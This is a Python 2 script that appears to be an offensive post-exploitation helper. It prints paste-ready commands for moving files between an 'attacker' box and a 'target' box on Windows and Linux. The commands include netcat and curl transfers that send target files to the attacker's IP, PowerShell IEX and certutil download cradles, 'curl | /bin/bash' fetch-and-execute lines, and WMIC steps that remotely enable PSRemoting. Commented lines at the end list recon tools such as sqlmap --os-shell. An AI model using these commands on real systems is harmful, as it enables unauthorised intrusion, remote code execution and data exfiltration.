#!/usr/bin/python
from os import system
from random import randint
import socket
port=str(randint(32768, 65534))
class bcolors:
    WARNING = '\033[93m'
    ENDC = '\033[0m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def Push():
        print ('')
        print bcolors.OKBLUE + ("You chose to move a file to the Attacker!") + bcolors.ENDC

        OSSelect = {
            0: WinPush,
            1: NixPush
        }   
        Selection = 0
        while (Selection != 2):
            print bcolors.WARNING + ("0. Win") + bcolors.ENDC
            print bcolors.WARNING + ("1. Nix") + bcolors.ENDC
            print bcolors.WARNING + ("2. Back") + bcolors.ENDC
            Selection = int(input("Select a Target OS: "))
            if (Selection >= 0) and (Selection < 2):
                OSSelect[Selection]()
def WinPush():
        system('clear')
        print bcolors.OKBLUE + ("You chose a Windows Box!") + bcolors.ENDC
        ip = GetTIP()
        f, p, r  = GetwinFile()
        myip = MyIP()
        print ('')
        print bcolors.WARNING + 'Using SMB:' + bcolors.ENDC
        print bcolors.OKGREEN + 'Attacker Box Commands:' + bcolors.ENDC
        print 'python /usr/share/doc/python-impacket/examples/smbserver.py WINSHARE /tmp'
        print bcolors.OKGREEN + 'Windows Target Box Commands:' + bcolors.ENDC
        print 'dir \\\\'+(myip)+'\\WINSHARE'
        print 'copy',(f), '\\\\'+(myip)+'\\WINSHARE\\'+(p)
        print ('')
        print bcolors.WARNING + 'Using Powershell:' + bcolors.ENDC
        print bcolors.OKGREEN + 'WINDOWS Attacker Box Commands:' + bcolors.ENDC
        print '$psversiontable.psversion'
        print 'wmic /node:'+(ip), '/user:<domain>\\administrator process call create \"Powershell Enable-PSRemoting -Force\"'
        print 'Set-Item wsman:\\localhost\\client\\trustedhosts -value \'*\' -force'
        print 'wmic /node:'+(ip), '/user:<domain>\\administrator process call create \"Powershell Restart-service winrm -force\"'
        print '$s1 = new-PSSession -ComputerName',(ip),'-Credential <domain>\\administrator'
        print 'enter-pssession -session $s1'
        print 'copy-item \"'+(f)+'\" -Destination \"C:\\windows\\temp\\'+(p)+'\" -toSession $s1'
        print 'remove-pssession $s1'
        print ('')
        print bcolors.WARNING + 'Using net use:' + bcolors.ENDC
        print bcolors.OKGREEN + 'WINDOWS Attacker Box Commands:' + bcolors.ENDC
        print 'net use z: \\\\'+(ip)+'\\c$ /user:<domain>\\administrator'
        #need to strip off c:\ from the file path output
        newf=f.replace("c:\\","z:\\")
        print 'copy',(newf), 'c:\\windows\\temp\\'+(p)
        print 'net use z: //delete'
        print ('')

def NixPush():      
        system('clear')
        print bcolors.OKBLUE + ("You chose a Nix Box!") + bcolors.ENDC
        ip = GetTIP()
        f, p, r  = GetFile()
        myip = MyIP()
        myport = port
        print ('')
        print bcolors.WARNING + 'Using Web:' + bcolors.ENDC
        print bcolors.OKGREEN + 'Attacker Box Commands:' + bcolors.ENDC
        print 'wget https://raw.githubusercontent.com/dfclin073/tten/master/file-upload -O /etc/nginx/sites-enabled/file-upload'
        print 'systemctl restart nginx'
        print bcolors.OKGREEN + 'Nix Target Commands:' + bcolors.ENDC
        print 'curl --upload-file',(f), (myip)+':8080'
        print ('')
        print bcolors.WARNING + 'Using NC:' + bcolors.ENDC
        print bcolors.OKGREEN + 'Attacker Box Commands:' + bcolors.ENDC
        print 'nc -nvlp', (myport), '> /tmp/'+(p) 
        print bcolors.OKGREEN + 'Nix Target Commands:' + bcolors.ENDC
        print 'nc -nv', (myip), (myport), '<', (f) 
        print ('')

def Pull():
        print ('')
        print bcolors.OKBLUE + ("You chose to move a file to the Target!") + bcolors.ENDC
        
        OSSelect = {
            0: WinPull,
            1: NixPull
        }   
        Selection = 0
        while (Selection != 2):
            print bcolors.WARNING + ("0. Win") + bcolors.ENDC
            print bcolors.WARNING + ("1. Nix") + bcolors.ENDC
            print bcolors.WARNING + ("2. Back") + bcolors.ENDC
            Selection = int(input("Select a target OS: "))
            if (Selection >= 0) and (Selection < 2):
                OSSelect[Selection]()
                
def WinPull():
        system('clear')
        print bcolors.OKBLUE + ("You chose a Windows Box!") + bcolors.ENDC
        ip = GetTIP()
        f, p, r  = GetFile()
        myip = MyIP()
        print ('')
        print bcolors.WARNING + 'Using Web:' + bcolors.ENDC
        print bcolors.OKGREEN + 'Attacker Box Commands:' + bcolors.ENDC
        print 'cd ' +(r)
        print 'python -m SimpleHTTPServer'
        print bcolors.OKGREEN + 'Windows Target Commands:' + bcolors.ENDC
        print '(new-object System.Net.WebClient).DownloadFile(\'http://'+(myip)+':8000/' +(p)+ '\',\'C:\\Windows\\temp\\' +(p)+ '\')'
        print bcolors.OKGREEN + 'OR' + bcolors.ENDC
        print 'certutil.exe -urlcache -split -f \"http://' +(myip)+':8000/'+(p)+'\" c:\\windows\\temp\\'+(p)
        print bcolors.OKGREEN + 'OR to load a powershell module into memory from web' + bcolors.ENDC
        print 'IEX (New-Object Net.Webclient).DownloadString(\"http://'+(myip)+':8000/'+(p)+'\")'
        print ('')
        print bcolors.WARNING + 'Using FTP:' + bcolors.ENDC
        print bcolors.OKGREEN + 'Attacker Box Commands:' + bcolors.ENDC
        print 'apt-get install python-pyftpdlib'
        print 'cd ' +(r)
        print 'python -m pyftpdlib -p 21'
        print bcolors.OKGREEN + 'OR' + bcolors.ENDC
        print 'MSF auxiliary/server/ftp can be used'
        print bcolors.OKGREEN + 'Windows Target Commands:' + bcolors.ENDC
        print 'echo open', (myip)+'>c:\\windows\\temp\\ftpconfig.txt&echo anonymous>>c:\\windows\\temp\\ftpconfig.txt&echo password>>c:\\windows\\temp\\ftpconfig.txt&echo binary>>c:\\windows\\temp\\ftpconfig.txt&echo get',(p)+'>>c:\\windows\\temp\\ftpconfig.txt&echo bye>>c:\\windows\\temp\\ftpconfig.txt&ftp -s:c:\\windows\\temp\\ftpconfig.txt'
        print ('')
        print bcolors.WARNING + 'Using SMB:' + bcolors.ENDC
        print bcolors.OKGREEN + 'Attacker Box Commands:' + bcolors.ENDC
        print 'smbclient -U domain\\\\administrator \\\\\\\\'+(ip)+'\\\\c$ -c \"put', (f), 'windows\\temp\\'+(p)+'\"'
        print ('')

def NixPull():                      
        myport = port
        system('clear')
        print bcolors.OKBLUE + ("You chose a Nix Box!") + bcolors.ENDC
        ip = GetTIP()
        f, p, r  = GetFile()
        myip = MyIP()
#myfile = GetFile()
        print ('')
        print bcolors.WARNING + 'Using Web:' + bcolors.ENDC
        print bcolors.OKGREEN + 'Attacker Commands:' + bcolors.ENDC
        print 'cd ' +(r)
        print 'python -m SimpleHTTPServer'
        #print 'curl --upload-file file.txt', (ip)+':'+(port)
        print bcolors.OKGREEN + 'Target Commands:' + bcolors.ENDC
        print 'wget', (myip)+':8000/' + (p)
        print bcolors.OKGREEN + 'OR' + bcolors.ENDC
        print 'telnet',(myip), '8000'
        print 'GET /'+(p), 'HTTP/1.1'
        print bcolors.OKGREEN + 'OR download from web and execute directly from memory' + bcolors.ENDC
        print 'curl', (myip)+':8000/'+(p), '| /bin/bash'
        print bcolors.OKGREEN + 'OR download functions from web into memory' + bcolors.ENDC
        print 'source /dev/stdin < <(curl', (myip)+':8000/'+(p)+')'
        print ('')
        print bcolors.WARNING + 'NC on target:' + bcolors.ENDC
        print bcolors.OKGREEN + 'Attacker Commands:' + bcolors.ENDC
        print 'nc -nvlp', (myport), '<', (f)
        print bcolors.OKGREEN + 'Target Commands:' + bcolors.ENDC
        print 'nc -nv', (myip), (myport), '> /tmp/'+(p)
        print ('')
        print bcolors.WARNING + 'SSH to target:' + bcolors.ENDC
        print bcolors.OKGREEN + 'Attacker Commands:' + bcolors.ENDC
        print 'ssh <user>@'+(ip), 'cat <',(p), '\">\"', (f)  
        print ('')


def GetAIP():
        Aip=raw_input ("What is your IP? : ")
        return Aip

def GetTIP():
        Tip=raw_input ("What is your Target IP? : ")
        return Tip

def GetFile():
        path=raw_input ("What file would you like to move? Please provide the full path : ")
        f = path.split("/")[-1]
        r = path.rsplit('/',1)[0]
        return path, f, r

def GetwinFile():                                                                           
        path=raw_input ("What file would you like to move? Please provide the full path : ")
        f = path.split("\\")[-1]
        r = path.rsplit('\\',1)[0]
        return path, f, r

def fname():
    f = GetFile()
    newfile = f.split("/")[-1]
    return newfile
    
def MyIP():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

def makeftpconfig():
        o = open("/tmp/ftp.conf","w+")
        o.write("open\r\n")
        o.write("ananymous\r\n")
        o.write("password\r\n")
        o.write("binary\r\n")
        o.write("get\r\n")
        o.write("bye\r\n ")
        o.close()

def main():
        PushPullSelect = {
            0: Push,
            1: Pull
        }
        Selection = 0
        while (Selection != 2):
            print bcolors.WARNING + ("0. To Attacker") + bcolors.ENDC
            print bcolors.WARNING + ("1. To Target") + bcolors.ENDC
            print bcolors.WARNING + ("2. Quit") + bcolors.ENDC
            Selection = int(input("Select a direction to move your files: "))
            if (Selection >= 0) and (Selection < 2):
                PushPullSelect[Selection]()

main()

#print bcolors.WARNING + 'Web Scanning:' + bcolors.ENDC
#print 'curl -s http://'+(ip)+'/robots.txt'
#print 'nikto -h', (ip)
#print 'sqlmap -u "http://'+(ip), '--os-shell'
#print 'gobuster -u http://'+(ip), '-w /usr/share/wordlists/dirb/big.txt -t 100'
#print 'vega'
#print ('')
#print bcolors.WARNING + 'Additional recon:' + bcolors.ENDC

#print 'dnsrecon -n 8.8.8.8 -r',(ip)+'/31'

#print ('')
#print 'dnsrecon -n 8.8.8.8 -d domain.com -t axfr'
#print ('')
#print 'snmpenum -t', (ip)
#print ('')
#print 'nc -nv', (ip), '25'
#print 'VRFY root'
#print ('')
